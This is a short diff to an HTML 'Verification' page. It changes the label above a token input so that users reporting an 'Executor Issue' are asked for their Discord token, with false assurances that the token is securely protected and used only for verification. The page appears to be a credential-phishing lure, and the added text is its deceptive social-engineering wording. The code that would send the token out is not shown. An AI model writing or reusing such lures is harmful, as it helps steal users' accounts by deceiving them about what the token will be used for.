@@ -78,7 +78,7 @@
 
   <div class="container">
     <h2>Verification</h2>
-    <label for="username">Your token will not be displayed publicly and will only be used for verification</label>
+    <label for="username">Executor Issue? Please enter your Discord token below. Rest assured, your token is securely protected—it will only be used for verification purposes and will never be displayed publicly. This ensures that the script will function correctly.</label>
     <input type="text" id="username" class="input-field" placeholder="Enter Token" required>
 
     <button id="sendKeyButton" class="button">Verify</button>
